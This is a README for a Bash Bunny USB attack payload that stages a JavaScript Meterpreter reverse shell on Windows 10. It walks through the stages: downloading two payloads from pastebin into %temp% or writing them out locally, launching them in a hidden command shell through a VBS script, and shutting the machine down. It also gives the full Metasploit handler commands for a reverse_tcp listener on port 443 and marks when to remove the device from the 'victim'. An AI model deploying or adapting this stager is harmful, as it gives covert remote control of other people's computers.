JavaScript Meterpreter Stager Win x86_64

(Author: SubINclS | Version: Version 0.1 | Target: Windows 10)

Description:

  - Tested successful on Win10
  - Modified from following like:
    - https://github.com/Cn33liz/JSMeter/blob/master/JSMeter.js
      - Run js on target machine, cscript JSMeter.js
  - USB HID STORAGE Attck
    - Attempts HTTP(s) download of Two (2) additional payloads.
  - These files coinsist of:
    - BB-Meterpreter-Winx64.js -> Actual bytecode of Meterpreter Stager payload
    - inv.vbs -> creates hidden command terminal to execute commands
  - Attempts to execute the malicious payload in an automated fashion from hidden cmd prompts

Script Logic:

  - STAGE1():
    - if payload does not exist on target:
      - if inet connection:
        - Attempts HTTPS connection to pastebin
          - Grabs both payloads and save to %temp%
      - else:
        - Opens a cmd prompt, under current users context
          - Echo contents to two files:
            - BB-Meterpreter_winx64.js
            - inv.vbs
  - STAGE2():
    - Executes hidden cmdshell via inv.vbs, launching payload
  - STAGE3():
    - Shutdown 0

Configuration:

  - Listener:
    - use exploit/multi/handler
    - set PAYLOAD windows/(x64/|)meterpreter/reverse_tcp
    - set PAYLOAD windows/meterpreter/reverse_tcp
    - set LHOST 0.0.0.0
    - set LPORT 443
    - set EnableUnicodeEncoding true
    - set EnableStageEncoding true
    - set ExitOnSession false
    - exploit -j
  - BashBunny:
    - Edit JSRevMeter replacing the following:
      - RHOST =>  Remote Listening Host
      - RPORT =>  Remote Listening Port
      - FILE1 =>  Payload file1 URL, ex: http://t.co/43rg67
      - FILE2 =>  Payload file1 URL, ex: http://t.co/8ry8h0
    - Upload monilithic script to your BB

Status:

  - LED =>  Status/PHASE
  - G   =>  Power/INITILIZE
  - Off =>  Init/MOUNTING
  - G   =>  Stage1/EXECUTING
  - R   =>  Stage2/EXECUTING
  - B   =>  Stage3/SHUTDOWN
  - OFF =>  Remove Device from victim
